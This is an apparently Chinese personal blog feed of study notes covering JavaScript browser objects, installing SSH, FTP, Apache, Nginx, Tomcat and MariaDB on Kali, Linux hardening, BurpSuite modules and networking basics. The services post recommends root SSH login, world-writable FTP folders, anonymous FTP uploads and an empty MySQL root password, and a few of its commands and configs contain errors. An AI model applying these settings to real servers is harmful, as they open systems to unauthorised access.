&lt;&#x2F;span&gt;&lt;span&gt;            .text span{font-weight:bold;color:black;}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            em{font-style:normal; color: red;}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            b{font-weight:normal;}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;style&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;p class=&amp;quot;text&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;lt;b id=&amp;quot;showcount&amp;quot;&amp;gt;您还可以输入&amp;lt;&#x2F;b&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;lt;span id=&amp;quot;totalbox&amp;quot;&amp;gt;&amp;lt;em id=&amp;quot;count&amp;quot;&amp;gt;30&amp;lt;&#x2F;em&amp;gt;&#x2F;30&amp;lt;&#x2F;span&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;div class=&amp;quot;input&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;lt;textarea name=&amp;quot;&amp;quot; id=&amp;quot;text&amp;quot; cols=&amp;quot;70&amp;quot; rows=&amp;quot;4&amp;quot;&amp;gt;&amp;lt;&#x2F;textarea&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F;获取文本框及其他元素&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var text=document.getElementById(&amp;quot;text&amp;quot;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var total=30;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var count=document.getElementById(&amp;quot;count&amp;quot;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var showcount=document.getElementById(&amp;quot;showcount&amp;quot;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var totalbox=document.getElementById(&amp;quot;totalbox&amp;quot;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F;绑定键盘事件&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.onkeyup=function()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &#x2F;&#x2F;获取文本框值的长度&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                var len=text.value.length;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &#x2F;&#x2F;计算可输入的剩余字符&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                var allow=total-len;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                var overflow=len-total;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &#x2F;&#x2F;如果allow小于0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                if(allow&amp;lt;0)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    showcount.innerHTML=&amp;quot;您已超出&amp;quot;+overflow;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    totalbox.innerHTML=&amp;#39;&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    showcount.innerHTML=&amp;#39;您还可以输入&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    totalbox.innerHTML=&amp;#39;&amp;lt;em id=&amp;quot;count&amp;quot;&amp;gt;&amp;#39;+allow+&amp;#39;&amp;lt;&#x2F;em&amp;gt;&#x2F;30&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;html&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JavaScript BOM&lt;&#x2F;p&gt;
&lt;p&gt;browser object model浏览器对象模型，可以实现JS与浏览器之间的交互。BOMyou下面几种对象：&lt;&#x2F;p&gt;
&lt;p&gt;window对象：是浏览器的实例。在浏览器中，window对象有双重角色，即是通过JS访问浏览器窗口的接口，也是ECMScript规定的全局对象&lt;&#x2F;p&gt;
&lt;p&gt;location对象：用于获取当前页面的地址（URL）并把浏览器重定向到新的页面。location对象提供了与当前窗口中加载的文档有关信息，它既是window对象的属性，也是document的属性&lt;&#x2F;p&gt;
&lt;p&gt;history对象：包含了浏览器的历史&lt;&#x2F;p&gt;
&lt;p&gt;screen对象：包含了用户屏幕的信息&lt;&#x2F;p&gt;
&lt;p&gt;navigator对象：包含了用户浏览器的信息&lt;&#x2F;p&gt;
&lt;p&gt;常用的对象方法&lt;&#x2F;p&gt;
&lt;p&gt;window.alert显示带有一段消息和一个确认按钮的警告框&lt;&#x2F;p&gt;
&lt;p&gt;window.promt如果用户单击提示框的取消按钮则返回一个null值，如果单击确认按钮，则返回输入字段当前的信息&lt;&#x2F;p&gt;
&lt;p&gt;window.confirm显示一个带有指定消息和OK以及取消按钮的对话框&lt;&#x2F;p&gt;
&lt;p&gt;window.open()打开一个新窗口&lt;&#x2F;p&gt;
&lt;p&gt;window.close()&lt;&#x2F;p&gt;
&lt;p&gt;window.moveto()&lt;&#x2F;p&gt;
&lt;p&gt;window.resizeto()&lt;&#x2F;p&gt;
&lt;p&gt;settimeout&lt;&#x2F;p&gt;
&lt;p&gt;setinterval&lt;&#x2F;p&gt;
&lt;p&gt;location.href返回加载页面的完整的URL&lt;&#x2F;p&gt;
&lt;p&gt;location.replace重定向URL地址&lt;&#x2F;p&gt;
&lt;p&gt;location.host返回服务器名称和端口号&lt;&#x2F;p&gt;
&lt;p&gt;location.hostname返回web主机的域名&lt;&#x2F;p&gt;
&lt;p&gt;locaion.port返回web主机 的端口&lt;&#x2F;p&gt;
&lt;p&gt;location.protocal返回web使用的协议&lt;&#x2F;p&gt;
&lt;p&gt;screen.availwidth可用的屏幕宽度&lt;&#x2F;p&gt;
&lt;p&gt;screen.availheight可用的屏幕高度&lt;&#x2F;p&gt;
&lt;p&gt;navigator.useragent返回浏览器的型号信息&lt;&#x2F;p&gt;
&lt;p&gt;screen对象&lt;&#x2F;p&gt;
&lt;p&gt;window.innerWidth&#x2F;innerHeight      浏览器的宽度和高度&lt;&#x2F;p&gt;
&lt;p&gt;window.screen.availwidth&#x2F;window.innerheight       屏幕的宽度和高度&lt;&#x2F;p&gt;
&lt;p&gt;navigator对象&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Linux系统服务</title>
		<published>2020-08-03T00:00:00+00:00</published>
		<updated>2020-08-03T00:00:00+00:00</updated>
		<link href="https://baz.ee/linuxxi-tong-fu-wu/" type="text/html"/>
		<id>https://baz.ee/linuxxi-tong-fu-wu/</id>
		<content type="html">&lt;p&gt;常见Linux服务&lt;&#x2F;p&gt;
&lt;p&gt;SSH服务&lt;&#x2F;p&gt;
&lt;p&gt;查看ssh服务有没有开启：ps -e |grep ssh&lt;&#x2F;p&gt;
&lt;p&gt;如果服务没有运行，通过命令 service ssh start、&#x2F;etc&#x2F;init.d&#x2F;ssh start启动&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;如果没有安装，通过命令apt install openssh-server来安装&lt;&#x2F;p&gt;
&lt;p&gt;如果安装成功，服务也开启成功，通过在客户端输入 ssh &lt;a href=&quot;mailto:username@x.x.x.x&quot;&gt;username@x.x.x.x&lt;&#x2F;a&gt;来登录&lt;&#x2F;p&gt;
&lt;p&gt;如果登录不成功，需要修改服务端ssh的配置&lt;&#x2F;p&gt;
&lt;p&gt;Vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config&lt;&#x2F;p&gt;
&lt;p&gt;将 #permitRootLogin 取消掉注释，并设置为yes&lt;&#x2F;p&gt;
&lt;p&gt;完成之后重启ssh服务&lt;&#x2F;p&gt;
&lt;p&gt;&#x2F;etc&#x2F;init.d&#x2F;ssh restart&lt;&#x2F;p&gt;
&lt;p&gt;然后再去使用客户端连接。&lt;&#x2F;p&gt;
&lt;p&gt;FTP服务&lt;&#x2F;p&gt;
&lt;p&gt;安装FTP服务（vsftpd）&lt;&#x2F;p&gt;
&lt;p&gt;apt install vsftpd&lt;&#x2F;p&gt;
&lt;p&gt;开启vsftpd服务&lt;&#x2F;p&gt;
&lt;p&gt;查看vsftpd服务有没有启动&lt;&#x2F;p&gt;
&lt;p&gt;在home路径下创建一个文件夹ftpfile，用来进行FTP的上传下载&lt;&#x2F;p&gt;
&lt;p&gt;Mkdir &#x2F;home&#x2F;ftpfile&lt;&#x2F;p&gt;
&lt;p&gt;创建好之后，修改文件夹权限为777&lt;&#x2F;p&gt;
&lt;p&gt;Chmod -R 777 &#x2F;home&#x2F;ftpfile&lt;&#x2F;p&gt;
&lt;p&gt;Ls -l查看权限&lt;&#x2F;p&gt;
&lt;p&gt;修改FTP配置&lt;&#x2F;p&gt;
&lt;p&gt;Vi &#x2F;etc&#x2F;vsftpd.conf，有些语句修改的时候只需要去掉注释&lt;&#x2F;p&gt;
&lt;p&gt;listen=YES&lt;&#x2F;p&gt;
&lt;p&gt;local_enable=YES 是否允许本地用户登录ftp&lt;&#x2F;p&gt;
&lt;p&gt;anonymous_enable=YES 匿名用户是否允许登录ftp&lt;&#x2F;p&gt;
&lt;p&gt;chroot_local_user=YES&lt;&#x2F;p&gt;
&lt;p&gt;local_root=&#x2F;home&#x2F;ftpfile&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;write_enable=YES&lt;&#x2F;p&gt;
&lt;p&gt;local_umask=022&lt;&#x2F;p&gt;
&lt;p&gt;anon_upload_enable=YES&lt;&#x2F;p&gt;
&lt;p&gt;anon_mkdir_write_enable=YES&lt;&#x2F;p&gt;
&lt;p&gt;local_root=DIR 本地用户访问时默认工作目录&lt;&#x2F;p&gt;
&lt;p&gt;allow_writeable_chroot=YES&lt;&#x2F;p&gt;
&lt;p&gt;注释掉 listen_ipv6&lt;&#x2F;p&gt;
&lt;p&gt;重启服务进行登录&lt;&#x2F;p&gt;
&lt;p&gt;可以测试一下，使用匿名用户登录&lt;&#x2F;p&gt;
&lt;p&gt;apache服务：&lt;&#x2F;p&gt;
&lt;p&gt;最流行的web服务端的软件之一，适用于中小型网站，开源的网页服务。&lt;&#x2F;p&gt;
&lt;p&gt;安装：apt install apache2&lt;&#x2F;p&gt;
&lt;p&gt;查看服务状态：&#x2F;etc&#x2F;init.d&#x2F;apache2 status&lt;&#x2F;p&gt;
&lt;p&gt;启动服务：&#x2F;etc&#x2F;init.d&#x2F;apache2 start&lt;&#x2F;p&gt;
&lt;p&gt;查看进程：ps -e | grep apache2&lt;&#x2F;p&gt;
&lt;p&gt;测试：浏览器输入kali的IP，如果能看到apache2的页面，就说明安装成功&lt;&#x2F;p&gt;
&lt;p&gt;（因为之前用过浏览器的代理，所以需要先关闭代理）&lt;&#x2F;p&gt;
&lt;p&gt;apache2的安装路径在 &#x2F;etc&#x2F;apache2&lt;&#x2F;p&gt;
&lt;p&gt;apache2.conf：全局配置文件&lt;&#x2F;p&gt;
&lt;p&gt;envvars：存放环境变量（一般不需要修改）&lt;&#x2F;p&gt;
&lt;p&gt;ports.conf：HTTP服务的端口&lt;&#x2F;p&gt;
&lt;p&gt;httpd.conf：用户的配置文件&lt;&#x2F;p&gt;
&lt;p&gt;默认情况下，apache会把网站的文件存放在&#x2F;etc&#x2F;www目录下&lt;&#x2F;p&gt;
&lt;p&gt;需要将html的文档放在&#x2F;var&#x2F;www&#x2F;html&#x2F;，然后通过浏览器访问&lt;&#x2F;p&gt;
&lt;p&gt;如果没有test.html，就创建一个，并添加下面内容&lt;&#x2F;p&gt;
&lt;p&gt;nginx服务：开源的支持高性能高并发的www服务器&lt;&#x2F;p&gt;
&lt;p&gt;安装、开启服务、测试步骤同上&lt;&#x2F;p&gt;
&lt;p&gt;需要注意一点，因为之前安装了apache2，所以在&#x2F;var&#x2F;www&#x2F;html目录下已经生成了一个apache2的index.html文件，nginx会调用apache2的index.html文件，显示的是apache2的测试页，如果要查看nginx的测试页，浏览器里输入：IP&#x2F;index.nginx-debian.html&lt;&#x2F;p&gt;
&lt;p&gt;安装好nginx后，我们的前端文件要放在&#x2F;var&#x2F;www&#x2F;html目录下，nginx的所有配置文件都在&#x2F;etc&#x2F;nginx下，程序文件在&#x2F;usr&#x2F;sbin&#x2F;nginx，日志文件放在&#x2F;var&#x2F;log&#x2F;nginx下&lt;&#x2F;p&gt;
&lt;p&gt;tomcat服务：免费开源的web应用服务，中小型网站&lt;&#x2F;p&gt;
&lt;p&gt;要使用tomcat要使用java环境，一般情况下kali自带java环境，通过命令java -version来查看&lt;&#x2F;p&gt;
&lt;p&gt;tomcat的安装：&lt;&#x2F;p&gt;
&lt;p&gt;先在官网下载后缀为tar.gz的安装包，之后在kali的&#x2F;usr路径下创建文件夹tomcat，然后把安装包移动到&#x2F;usr&#x2F;tomcat下，然后修改tomcat文件夹的权限，然后进入目录&#x2F;usr&#x2F;tomcat&#x2F;，解压安装包tar -zxvf + 安装包，解压之后就会出现一个arache-tomcat-8.5.57的目录，进入该目录，会有一个bin文件夹，其中有startup.sh的文件，编辑这个文件，在最后一行加入：&lt;&#x2F;p&gt;
&lt;p&gt;#set java environment
export JAVA_HOME=&#x2F;usr&#x2F;local&#x2F;lib&#x2F;jdk1.8.0_231
export JRE_HOME=${JAVA_HOME}&#x2F;jre
export CLASSPATH=.:%{JAVA_HOME}&#x2F;lib:%{JRE_HOME}&#x2F;lib
export PATH=${JAVA_HOME}&#x2F;bin:$PATH&lt;&#x2F;p&gt;
&lt;p&gt;#tomcat
export TOMCAT_HOME=&#x2F;usr&#x2F;tomcat&#x2F;apache-tomcat-8.5.54&lt;&#x2F;p&gt;
&lt;p&gt;注意jdk的版本要和自己的电脑匹配&lt;&#x2F;p&gt;
&lt;p&gt;最后运行startup.sh，命令是sudo .&#x2F;startup.ssh&lt;&#x2F;p&gt;
&lt;p&gt;测试：在浏览器中，输入http:&#x2F;&#x2F;IP:8080&lt;&#x2F;p&gt;
&lt;p&gt;关闭tomcat，需要先在文件shutdown.sh对应位置，添加信息：&lt;&#x2F;p&gt;
&lt;p&gt;#set java environment
export JAVA_HOME=&#x2F;usr&#x2F;local&#x2F;lib&#x2F;jdk1.8.0_231
export JRE_HOME=${JAVA_HOME}&#x2F;jre
export CLASSPATH=.:%{JAVA_HOME}&#x2F;lib:%{JRE_HOME}&#x2F;lib
export PATH=${JAVA_HOME}&#x2F;bin:$PATH&lt;&#x2F;p&gt;
&lt;p&gt;#tomcat
export TOMCAT_HOME=&#x2F;usr&#x2F;tomcat&#x2F;apache-tomcat-8.5.54&lt;&#x2F;p&gt;
&lt;p&gt;注：vsftpd的配置文件&#x2F;etc&#x2F;vsftpd.conf中&amp;quot;listen=YES&amp;quot;和&amp;quot;listen_ipv6=YES&amp;quot;是不能同时开启的。若要求同时支持ipv4和ipv6，只需要保留listen_ipv6即可。&lt;&#x2F;p&gt;
&lt;p&gt;然后执行命令sudo .&#x2F;shutdown.sh&lt;&#x2F;p&gt;
&lt;p&gt;如果要打开html页面，要在webapps目录下创建一个目录（这个目录可以理解成一个网站的项目），然后再把test.html放进目录中，最后在浏览器中输入：
http:&#x2F;&#x2F;IP:8080&#x2F;test&#x2F;test.html&lt;&#x2F;p&gt;
&lt;p&gt;MySQL服务：是最流行的关系型数据库管理系统，再web方面mysql是最好的应用软件之一。&lt;&#x2F;p&gt;
&lt;p&gt;特点：&lt;&#x2F;p&gt;
&lt;p&gt;开源&lt;&#x2F;p&gt;
&lt;p&gt;支持大型的数据库，可以处理上千万条记录的数据库&lt;&#x2F;p&gt;
&lt;p&gt;使用的是标准的SQL数据语言&lt;&#x2F;p&gt;
&lt;p&gt;跨平台支持，可以定制&lt;&#x2F;p&gt;
&lt;p&gt;MySQL安装：&lt;&#x2F;p&gt;
&lt;p&gt;在kali中，数据库使用的是mariaDB，其属于MySQL的一个分支&lt;&#x2F;p&gt;
&lt;p&gt;apt install mariadb-server&lt;&#x2F;p&gt;
&lt;p&gt;启动mariadb服务：&#x2F;etc&#x2F;init.d&#x2F;mysql start&lt;&#x2F;p&gt;
&lt;p&gt;查看是否启动成功：netstat -tap | grep mysql  ，如果是listen状态，那就说明启动成功&lt;&#x2F;p&gt;
&lt;p&gt;接下来需要连接数据库：mysql -u root -p&lt;&#x2F;p&gt;
&lt;p&gt;因为安装过程中没有设置密码，所以密码默认为空&lt;&#x2F;p&gt;
&lt;p&gt;Linux安全配置&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;禁用用户和组&lt;&#x2F;p&gt;
&lt;p&gt;当某些用户或者组不使用的时候，可以直接在passwd或者group文件中注释掉&lt;&#x2F;p&gt;
&lt;p&gt;&#x2F;etc&#x2F;passwd            &#x2F;etc&#x2F;group&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;禁用某些服务&lt;&#x2F;p&gt;
&lt;p&gt;service xxx stop         &#x2F;etc&#x2F;init.d&#x2F;xxx stop&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;iptables设置(kali不可以直接使用iptables)&lt;&#x2F;p&gt;
&lt;p&gt;可以当作Linux系统的防火墙，管理员可以通过设置规则，对进出iptables的数据包进行过滤（放行、拒绝、丢弃）&lt;&#x2F;p&gt;
&lt;p&gt;先查看系统是否安装防火墙&lt;&#x2F;p&gt;
&lt;p&gt;which iptables&lt;&#x2F;p&gt;
&lt;p&gt;whereis iptables&lt;&#x2F;p&gt;
&lt;p&gt;如果没有的话需要安装：sudo apt-get install ufw&lt;&#x2F;p&gt;
&lt;p&gt;开启iptables：ufw enable&lt;&#x2F;p&gt;
&lt;p&gt;关闭iptables：ufw disable&lt;&#x2F;p&gt;
&lt;p&gt;配置防火墙策略：
先打开kali 的apache2或者nginx服务，然后再本地使用浏览器访问web服务器，如果能访问成功，接下来再kali的ufw添加策略，拒绝掉http的流量。如果访问不成功，可能是ufw影响，所以先关闭ufw，则能正常访问，然后再开启ufw，设置http的放行策略。&lt;&#x2F;p&gt;
&lt;p&gt;拒绝http流量，通过ufw deny http       ufw delete allow http&lt;&#x2F;p&gt;
&lt;p&gt;放行http流量，通过ufw allow http&lt;&#x2F;p&gt;
&lt;p&gt;ufw deny proto tcp from 源 to 目的 port 80&lt;&#x2F;p&gt;
&lt;p&gt;ufw deny proto tcp from any to IP port 80 &lt;&#x2F;p&gt;
&lt;p&gt;重置所有规则&lt;&#x2F;p&gt;
&lt;p&gt;ufw reset&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;登录设置&lt;&#x2F;p&gt;
&lt;p&gt;登录超时设置&lt;&#x2F;p&gt;
&lt;p&gt;用户在5分钟内无操作则超时端口连接，需要在&#x2F;etc&#x2F;profile添加&lt;&#x2F;p&gt;
&lt;p&gt;export TMOUT=300&lt;&#x2F;p&gt;
&lt;p&gt;readonly TMOUT&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;​	   禁止root直接远程登录&lt;&#x2F;p&gt;
&lt;p&gt;​		vim .&#x2F;etc&#x2F;ssh&#x2F;sshd_config&lt;&#x2F;p&gt;
&lt;p&gt;​		permitRootLogin no&lt;&#x2F;p&gt;
&lt;p&gt;​		限制登录失败次数并锁定&lt;&#x2F;p&gt;
&lt;p&gt;​		在&#x2F;etc&#x2F;pam.d&#x2F;login后添加&lt;&#x2F;p&gt;
&lt;p&gt;​		Auth required pam_tally2.so deny=6 unlock_time=180 even_deny_root &lt;&#x2F;p&gt;
&lt;p&gt;​		root_unlock_time=180&lt;&#x2F;p&gt;
&lt;p&gt;​		登录IP限制&lt;&#x2F;p&gt;
&lt;p&gt;​		要与某一段固定IP或IP段绑定，更严格的限制容许SSH的用户和来源IP&lt;&#x2F;p&gt;
&lt;p&gt;​		Vim &#x2F;etc&#x2F;ssh&#x2F;sshd.config&lt;&#x2F;p&gt;
&lt;p&gt;​		## allowed ssh users sysmgr&lt;&#x2F;p&gt;
&lt;p&gt;​		AllowUsers sysmgr@172.29.73.*&lt;&#x2F;p&gt;
&lt;p&gt;​		DenyUsers &lt;a href=&quot;mailto:sysmgr@172.29.73.*&quot;&gt;sysmgr@172.29.73.*&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;​		使用的密钥文件登录&lt;&#x2F;p&gt;
&lt;p&gt;​		极大提高安全性&lt;&#x2F;p&gt;
&lt;p&gt;​		减少history命令记录&lt;&#x2F;p&gt;
&lt;p&gt;​&lt;&#x2F;p&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;
&lt;p&gt;防止一般网络攻击&lt;&#x2F;p&gt;
&lt;p&gt;禁ping&lt;&#x2F;p&gt;
&lt;p&gt;防止IP欺骗&lt;&#x2F;p&gt;
&lt;p&gt;防止DOS攻击&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;修复已知安全漏洞&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;定期日志安全检查&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>BurpSuite基础</title>
		<published>2020-08-01T00:00:00+00:00</published>
		<updated>2020-08-01T00:00:00+00:00</updated>
		<link href="https://baz.ee/burpsuiteji-chu/" type="text/html"/>
		<id>https://baz.ee/burpsuiteji-chu/</id>
		<content type="html">&lt;p&gt;Burpsuite主界面&lt;&#x2F;p&gt;
&lt;p&gt;分为核心功能和辅助功能&lt;&#x2F;p&gt;
&lt;p&gt;核心功能：目标 代理 爬虫 扫描 入侵&lt;&#x2F;p&gt;
&lt;p&gt;辅助功能：重放 序列器 解码器 对比&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;target：用于设置扫描域，生成站点地图，生成安全分析&lt;&#x2F;p&gt;
&lt;p&gt;proxy：用于拦截浏览器的http的会话内容&lt;&#x2F;p&gt;
&lt;p&gt;spider：用于自动爬取网站的每个页面的内容，并生成完整的站点地图&lt;&#x2F;p&gt;
&lt;p&gt;Scanner：用来自动化扫描漏洞，分为主动扫描和被动扫描&lt;&#x2F;p&gt;
&lt;p&gt;intruder：根据上面检测到的可能存在漏洞的连接，调用攻击载荷，对目标链接进行攻击。入侵模块的原理就是根据访问链接中存在的参数&#x2F;变量，调用本地词典、攻击载荷，对参数进行渗透测试。&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>通信网络基础</title>
		<published>2020-08-01T00:00:00+00:00</published>
		<updated>2020-08-01T00:00:00+00:00</updated>
		<link href="https://baz.ee/tong-xin-wang-luo-ji-chu/" type="text/html"/>
		<id>https://baz.ee/tong-xin-wang-luo-ji-chu/</id>
		<content type="html">&lt;p&gt;前提：电脑必须要有IP地址，并且可以连接到互联网&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;浏览器搜索栏输入域名&lt;&#x2F;li&gt;
&lt;li&gt;回车之后，做域名解析，得到IP地址&lt;&#x2F;li&gt;
&lt;li&gt;网卡产生数据包&lt;&#x2F;li&gt;
&lt;li&gt;电脑和服务器产生一个会话（管道），之后数据流量都通过这个管道传递&lt;&#x2F;li&gt;
&lt;li&gt;服务器收到数据包之后，做出回应（数据包）&lt;&#x2F;li&gt;
&lt;li&gt;电脑收到服务器回复的数据包之后，读取数据包内容，通过浏览器显示给用户&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;通信子网的功能是把信息从一台主机传输到另一台主机；资源子网是各种网络资源（硬件、软件、数据信息）的集合。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;ol&gt;
&lt;li&gt;现在使用的网络属于第三代互联网，互联网的前身是阿帕网（ARPANET）&lt;&#x2F;li&gt;
&lt;li&gt;TCP&#x2F;IP协议提出的目的是为了解决阿帕网只能支持“同构”设备这一限制&lt;&#x2F;li&gt;
&lt;li&gt;同构环境是网络上的所有计算机都运行相同的操作系统&lt;&#x2F;li&gt;
&lt;li&gt;现在的TCP&#x2F;IP协议不仅支持tcp和ip两个协议，也包括其他协议，比如http、dns、arp、dhcp等等，所以也可以称为TCP&#x2F;IP协议族&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;网络接入层：&lt;&#x2F;p&gt;
&lt;p&gt;在网络接口层，发送的数据的时候是以字节为单位对比特流进行分组，并且按照一定的顺序依次发送
在以太网里面，一组电信号就是一个数据包，数据包被称为数据帧
MAC地址总长度为48比特，全球唯一。分为两部分，前面24位为厂商编号，后24位为厂商指定的号码&lt;&#x2F;p&gt;
&lt;p&gt;链路层的主要作用是对电信号进行分组并形成局具有特定意义的数据帧，然后通过物理介质发送给接收方&lt;&#x2F;p&gt;
&lt;p&gt;局域网通信的时候，需要知道对方的MAC地址，这个可以通过ARP（地址解析协议，通过IP地址来请求对方的MAC地址）协议来实现。&lt;&#x2F;p&gt;
&lt;p&gt;互联网络层：
同一个局域网的设备都属于同一个IP网段，如果不同网段的话，两个设备之间通信的时候就要借助路由器来转发数据&lt;&#x2F;p&gt;
&lt;p&gt;IP地址长度为32比特，分为网络部分和主机部分，比如192.168.0.1 ，掩码（1代表网络位，0代表主机位）为255.255.255.0，代表这个IP地址的网络部分为192.168.0.0&lt;&#x2F;p&gt;
&lt;p&gt;11000000 10101000 00000000 00000001&lt;&#x2F;p&gt;
&lt;p&gt;11111111 11111111 11111111 00000000&lt;&#x2F;p&gt;
&lt;p&gt;路由器在收到主机的数据包之后，会读取数据表里面的目的IP地址，然后查找自己的路由表进行转发。路由器生成路由表要使用路由协议&lt;&#x2F;p&gt;
&lt;p&gt;传输层：&lt;&#x2F;p&gt;
&lt;p&gt;传输层由两个协议，TCP和UDP&lt;&#x2F;p&gt;
&lt;p&gt;TCP全称传输控制协议，特点是面向连接的，可靠的&lt;&#x2F;p&gt;
&lt;p&gt;UDP全称用户数据报协议，特点是面向无连接不可靠的&lt;&#x2F;p&gt;
&lt;p&gt;应用层：&lt;&#x2F;p&gt;
&lt;p&gt;对用户提供应用或者服务（Telnet ssh dhcp dns···）&lt;&#x2F;p&gt;
&lt;p&gt;定义数据的格式，编码与解码，压缩与解压缩，加密与解密，数据包的拼装&lt;&#x2F;p&gt;
&lt;p&gt;创建与管理会话&lt;&#x2F;p&gt;
&lt;p&gt;端口号是用来区分应用层使用的是哪一种应用或服务&lt;&#x2F;p&gt;
